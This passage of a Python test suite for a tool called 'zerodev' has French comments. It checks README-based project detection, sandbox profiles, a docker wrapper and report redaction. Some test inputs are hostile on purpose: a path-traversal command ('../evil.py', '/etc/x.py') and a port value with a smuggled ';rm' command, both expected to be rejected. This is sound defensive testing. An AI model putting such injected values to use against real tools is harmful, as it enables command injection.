        self.assertEqual(plan.disambiguate_project(r, ["api", "web"]), ("web", "README"))
        (r / "README.md").write_text("```\ncd api\nnpm start\ncd ../web\nnpm start\n```\n")
        self.assertIsNone(plan.disambiguate_project(r, ["api", "web"]))

    def test_prose_does_not_count(self):
        r = self._mono(readme="Le dossier web contient le front ; faites cd web puis lancez-le.\n")
        self.assertIsNone(plan.disambiguate_project(r, ["api", "web"]))

    def test_resolve_project_picks_it_with_note(self):
        r = self._mono(readme="```\ncd api\nnpm start\n```\n")
        sub, p = plan.resolve_project(r)
        self.assertEqual(sub.name, "api")
        self.assertTrue(any("monorepo" in n and "--project" in n for n in p.notes))

    def test_still_ambiguous_without_evidence(self):
        with self.assertRaises(AmbiguousProject):
            plan.resolve_project(self._mono())

    def test_multistack_is_never_preempted(self):
        r = self.tmp / "ms"
        (r / "backend").mkdir(parents=True)
        (r / "frontend").mkdir()
        (r / "backend" / "requirements.txt").write_text("flask\n")
        (r / "backend" / "app.py").write_text("x")
        (r / "frontend" / "package.json").write_text(json.dumps({"scripts": {"start": "node s.js"}}))
        (r / "README.md").write_text("```\ncd backend\npython app.py\n```\n")
        with self.assertRaises(AmbiguousProject) as cm:
            plan.resolve_project(r)
        self.assertTrue(cm.exception.multistack)


class TestSandboxMacOS(unittest.TestCase):
    def setUp(self):
        from zerodev import sandbox
        self.sb = sandbox
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.addCleanup(sandbox.disable)

    def _paths(self):
        d = Path(self.tmp.name)
        (d / "proj").mkdir()
        (d / "home").mkdir()
        return d / "proj", d / "home", d / "zh"

    def test_profile_denies_then_allows_in_order(self):
        root, home, zh = self._paths()
        prof = self.sb.seatbelt_profile(root, home=home, zhome=zh)
        lines = prof.splitlines()
        self.assertEqual(lines[:2], ["(version 1)", "(allow default)"])
        deny_w = lines.index("(deny file-write*)")
        allow_w = next(i for i, l in enumerate(lines) if l.startswith("(allow file-write* (subpath"))
        deny_r = next(i for i, l in enumerate(lines) if l.startswith("(deny file-read*"))
        allow_r = next(i for i, l in enumerate(lines) if l.startswith("(allow file-read*"))
        self.assertLess(deny_w, allow_w)
        self.assertLess(deny_r, allow_r)                       # SBPL : la dernière règle l'emporte
        self.assertIn(str(root.resolve()), lines[allow_w])
        self.assertIn(str(zh.resolve()), lines[allow_r])
        self.assertIn(str(home.resolve()), lines[deny_r])
        self.assertNotIn("network", prof)                      # réseau volontairement non isolé

    def test_paths_with_quotes_are_escaped(self):
        self.assertEqual(self.sb._sbpl('/a"b\\c'), '"/a\\"b\\\\c"')

    def test_wrap_macos_command_shape(self):
        root, home, zh = self._paths()
        w = self.sb.wrap("echo 'a b' && ls", root, mode="sandbox-exec", home=home, zhome=zh)
        self.assertTrue(w.startswith("sandbox-exec -p "))
        self.assertIn(" env UV_CACHE_DIR=", w)
        self.assertTrue(w.endswith("sh -c " + __import__("shlex").quote("echo 'a b' && ls")))

    def test_not_available_off_macos_without_bwrap(self):
        from unittest import mock
        with mock.patch.object(self.sb, "_bwrap_usable", return_value=False), mock.patch.object(self.sb.sys, "platform", "linux"), \
                mock.patch.dict(self.sb._state, {"ok": None, "backend": None}):
            self.assertIsNone(self.sb.backend())
            self.assertFalse(self.sb.available())

    def test_backend_prefers_bwrap_then_seatbelt(self):
        from unittest import mock
        with mock.patch.object(self.sb, "_bwrap_usable", return_value=False), mock.patch.object(self.sb, "_seatbelt_usable", return_value=True), \
                mock.patch.dict(self.sb._state, {"ok": None, "backend": None}):
            self.assertEqual(self.sb.backend(), "sandbox-exec")
        with mock.patch.object(self.sb, "_bwrap_usable", return_value=True), mock.patch.object(self.sb, "_seatbelt_usable", return_value=True), \
                mock.patch.dict(self.sb._state, {"ok": None, "backend": None}):
            self.assertEqual(self.sb.backend(), "bwrap")


class TestRealWorldFalsePositives(Base):
    """Cas relevés sur de vrais dépôts (mesure du 27/10/2026) où la première version de 0.25.0 se trompait."""

    def _mono(self, readme, dirs=("fastapi-backend", "webapp")):
        r = self.tmp / "m"
        r.mkdir(exist_ok=True)
        for d in dirs:
            (r / d).mkdir(exist_ok=True)
            (r / d / "package.json").write_text(json.dumps({"scripts": {"dev": "node s.js"}}))
            (r / d / "s.js").write_text("1")
        (r / "README.md").write_text(readme)
        return r

    def test_cd_followed_by_tests_is_not_a_launch(self):          # mycelium : `cd fastapi-backend` puis pytest/ruff
        r = self._mono("```bash\ncd fastapi-backend\nuv sync --group dev\nuv run pytest tests/ -x -q\n```\n")
        self.assertIsNone(plan.disambiguate_project(r, ["fastapi-backend", "webapp"]))

    def test_other_launch_command_at_root_blocks_the_pick(self):  # hoop : `make run-dev` à la racine + `cd webapp && npm run dev`
        r = self._mono("```\nmake run-dev\ncd webapp && npm run dev\n```\n")
        self.assertIsNone(plan.disambiguate_project(r, ["fastapi-backend", "webapp"]))

    def test_cd_on_same_line_with_launch_counts(self):
        r = self._mono("```\ncd webapp && npm run dev\n```\n")
        self.assertEqual(plan.disambiguate_project(r, ["fastapi-backend", "webapp"]), ("webapp", "README"))

    def test_block_starts_back_at_root(self):
        r = self._mono("```\ncd fastapi-backend\n```\n\n```\nnpm run dev\n```\n")
        self.assertIsNone(plan.disambiguate_project(r, ["fastapi-backend", "webapp"]))

    def test_utility_scripts_are_not_the_app(self):               # screentinker, ultimate_bug_scanner
        def run(line, f, lang="python"):
            r = self.tmp / "u"
            r.mkdir(exist_ok=True)
            (r / f).parent.mkdir(parents=True, exist_ok=True)
            (r / f).write_text("x")
            (r / "README.md").write_text(f"```\n{line}\n```\n")
            return plan.readme_run(r, lang)
        self.assertIsNone(run("node scripts/reset-admin.js", "scripts/reset-admin.js", "node"))
        self.assertIsNone(run("python test-suite/run_manifest.py", "test-suite/run_manifest.py"))
        self.assertIsNone(run("python migrate.py", "migrate.py"))
        self.assertIsNone(run("python -m tools.seed", "tools/seed.py"))
        self.assertEqual(run("python ileappGUI.py", "ileappGUI.py")[0], "python ileappGUI.py")
        self.assertEqual(run("node server.js", "server.js", "node")[0], "node server.js")


class TestReadmeFormats(Base):
    def _run(self, readme):
        r = self.tmp / "f"
        r.mkdir(exist_ok=True)
        (r / "README.md").write_bytes(readme.encode())
        (r / "app.py").write_text("x")
        return plan.readme_run(r, "python")

    def test_indented_block(self):
        self.assertEqual(self._run("Lancer :\n\n    python app.py\n\nFin\n")[0], "python app.py")

    def test_tilde_fence(self):
        self.assertEqual(self._run("~~~\npython app.py\n~~~\n")[0], "python app.py")

    def test_windows_line_endings(self):
        self.assertEqual(self._run("# T\r\n```bash\r\npython app.py\r\n```\r\n")[0], "python app.py")

    def test_unicode_path_and_traversal(self):
        self.assertIsNone(self._run("```\npython ../evil.py\npython /etc/x.py\n```\n"))


class TestContainerWrapper(Base):
    """contrib/zero-container.sh : la commande construite est vérifiée avec un FAUX docker (aucun conteneur réel n'est lancé)."""
    SCRIPT = Path(__file__).resolve().parents[1] / "contrib" / "zero-container.sh"

    def _run(self, *args, env=None, with_fake=True):
        fake = self.tmp / "bin"
        fake.mkdir(exist_ok=True)
        if with_fake:
            (fake / "docker").write_text("#!/bin/sh\nprintf '%s\\n' \"$@\"\n")
            (fake / "docker").chmod(0o755)
        e = {"PATH": f"{fake}:/usr/bin:/bin", **(env or {})} if with_fake else {"PATH": "/usr/bin:/bin"}
        return subprocess.run(["sh", str(self.SCRIPT), *args], capture_output=True, text=True, env=e)

    def test_command_shape(self):
        repo = self.tmp / "dep"
        repo.mkdir()
        r = self._run(str(repo), "--services", "local", env={"ZERO_PORTS": "3000 8000"})
        self.assertEqual(r.returncode, 0, r.stderr)
        argv = r.stdout.split("\n")
        self.assertEqual(argv[0], "run")
        for flag in ("--rm", "--cap-drop", "ALL", "no-new-privileges", "--pids-limit", "--memory", "-p", "3000:3000", "8000:8000"):
            self.assertIn(flag, argv)
        self.assertIn(f"{repo.resolve()}:/work", argv)
        self.assertEqual(argv[argv.index("zerodev:latest"):][:4], ["zerodev:latest", "/work", "--services", "local"])

    def test_bad_port_is_refused_before_running(self):
        repo = self.tmp / "dep"
        repo.mkdir()
        r = self._run(str(repo), env={"ZERO_PORTS": "3000;rm"})
        self.assertEqual(r.returncode, 2)
        self.assertEqual(r.stdout, "")

    def test_no_runtime_and_missing_dir(self):
        repo = self.tmp / "dep"
        repo.mkdir()
        self.assertEqual(self._run(str(repo), with_fake=False).returncode, 1)
        self.assertEqual(self._run(str(self.tmp / "absent")).returncode, 2)


class TestReport(Base):
    def test_redact_home_user_and_colors(self):
        from zerodev import report
        txt = "\x1b[1mPlan\x1b[0m /home/alice/code/x et /home/alice/.zero/envs ; utilisateur alice ; malice reste ; alice2 aussi"
        out = report.redact(txt, home=Path("/home/alice"), user="alice")
        self.assertEqual(out, "Plan ~/code/x et ~/.zero/envs ; utilisateur <user> ; malice reste ; alice2 aussi")

    def test_redact_ignores_short_or_generic_users(self):
        from zerodev import report
        self.assertEqual(report.redact("root user a", home=Path("/nonexistent-h"), user="a"), "root user a")
        self.assertEqual(report.redact("root user", home=Path("/nonexistent-h"), user="root"), "root user")

    def test_build_has_plan_and_no_personal_path(self):
        from zerodev import report
        repo = self.tmp / "monprojet"
        repo.mkdir()
        (repo / "package.json").write_text(json.dumps({"scripts": {"start": "node s.js"}}))
        (repo / "s.js").write_text("1")
        out = report.build(str(repo), network=False)
        self.assertIn(f"## plan : monprojet", out)
        self.assertIn("npm run start", out)
        self.assertIn("## doctor", out)
        if len(str(Path.home())) > 1:
            self.assertNotIn(str(Path.home()), out)
        self.assertNotIn("\x1b[", out)

    def test_build_on_unsupported_dir_reports_error_instead_of_crashing(self):
        from zerodev import report
        repo = self.tmp / "vide"
        repo.mkdir()
        out = report.build(str(repo), network=False)
        self.assertIn("## plan : vide", out)
        self.assertIn("## ce qui s'est passé", out)


class TestForeignHints(Base):
    def _repo(self, name, text="x"):
        r = self.tmp / "f"
        r.mkdir(exist_ok=True)
        (r / name).write_text(text)
        return r

    def test_each_ecosystem_names_itself_and_gives_a_manual_command(self):
        for manifest, needle in (("Gemfile", "bundle install"), ("composer.json", "composer install"), ("pom.xml", "mvnw"),
                                 ("build.gradle", "gradlew"), ("mix.exs", "mix deps.get"), ("CMakeLists.txt", "cmake")):
            r = self.tmp / manifest.replace(".", "_")
            r.mkdir()
            (r / manifest).write_text("x")
            with self.assertRaises(ZeroError) as cm:
                plan.detect_all(r)
            msg = str(cm.exception)
            self.assertIn("écosystème non supporté", msg, manifest)
            self.assertIn(manifest, msg)
            self.assertIn(needle, msg, manifest)
            self.assertIn("À la main", msg)

    def test_dotnet(self):
        r = self._repo("App.csproj")
        with self.assertRaises(ZeroError) as cm:
            plan.detect_all(r)
        self.assertIn("dotnet run", str(cm.exception))

    def test_plain_empty_dir_keeps_generic_message(self):
        r = self.tmp / "vide2"
        r.mkdir()
        with self.assertRaises(ZeroError) as cm:
            plan.detect_all(r)
        self.assertIn("aucun projet Node, Python, Rust ou Go détecté", str(cm.exception))

    def test_node_frontend_of_foreign_project_also_gets_the_hint(self):
        r = self.tmp / "rails"
        r.mkdir()
        (r / "Gemfile").write_text("x")
        (r / "package.json").write_text(json.dumps({"scripts": {"dev": "vite"}}))
        with self.assertRaises(ZeroError) as cm:
            plan.detect_all(r)
        self.assertIn("bundle install", str(cm.exception))
        self.assertIn("outillage front", str(cm.exception))
